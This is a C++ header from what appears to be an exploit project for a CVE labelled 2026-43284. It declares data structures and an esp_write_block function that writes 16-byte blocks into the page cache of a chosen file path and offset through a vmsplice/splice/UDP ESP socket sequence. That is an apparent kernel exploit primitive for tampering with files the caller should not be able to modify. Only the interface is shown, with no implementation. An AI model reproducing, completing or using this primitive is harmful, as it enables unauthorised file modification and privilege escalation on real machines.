#pragma once

#include <cstdint>
#include <sys/types.h>

namespace ghostlock::backend::cve_2026_43284::lib {

/** A connected ESP endpoint. Pure data; no ownership of the fd. */
struct RawEspEndpoint {
    int sock = -1;
    std::uint32_t spi = 0;
};

/** One 16-byte page-cache write request. */
struct RawEspWrite {
    const char *path = nullptr;
    off_t offset = 0;
    const std::uint8_t *iv = nullptr;
    std::uint32_t sequence = 0;
};

/** Failure detail; stage is a static string, err is errno. */
struct RawEspError {
    const char *stage = nullptr;
    int err = 0;
};

/**
 * Write one CBC block through the DFRoot vmsplice/splice/UDP sequence.
 *
 * @param endpoint connected UDP socket + SPI
 * @param write    target path, offset, 16-byte IV, sequence
 * @param error    optional failure detail
 * @return true on a complete 40-byte datagram
 */
bool esp_write_block(const RawEspEndpoint &endpoint, const RawEspWrite &write, RawEspError *error) noexcept;

}  // namespace ghostlock::backend::cve_2026_43284::lib
